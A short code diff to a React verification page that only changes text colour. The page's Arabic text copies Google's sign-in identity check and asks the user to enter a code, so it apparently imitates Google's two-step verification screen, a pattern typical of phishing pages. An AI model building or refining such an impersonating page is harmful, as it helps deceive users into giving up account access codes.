@@ -84,7 +84,7 @@ export default function VerificationPage() {
           <div className="flex flex-col md:flex-row gap-6 w-full">
             {/* القسم الأيمن */}
             <div className="flex-1">
-              <h1 className="text-2xl md:text-3xl font-semibold mb-2">تأكيد الهوية</h1>
+              <h1 className="text-2xl md:text-3xl font-semibold mb-2 text-gray-600">تأكيد الهوية</h1>
               <p className="text-gray-700 mb-6 text-sm" dir="rtl">
                 للمساعدة في الحفاظ على أمان حسابك، تريد Google التأكد من أنك بالفعل تحاول تسجيل الدخول
               </p>
@@ -112,7 +112,7 @@ export default function VerificationPage() {
                   type="text"
                   value={code}
                   onChange={(e) => setCode(e.target.value)}
-                  className="flex-1 px-3 py-2 outline-none"
+                  className="flex-1 px-3 py-2 outline-none text-gray-600"
                   placeholder="أدخل الرمز"
                 />
               </div>
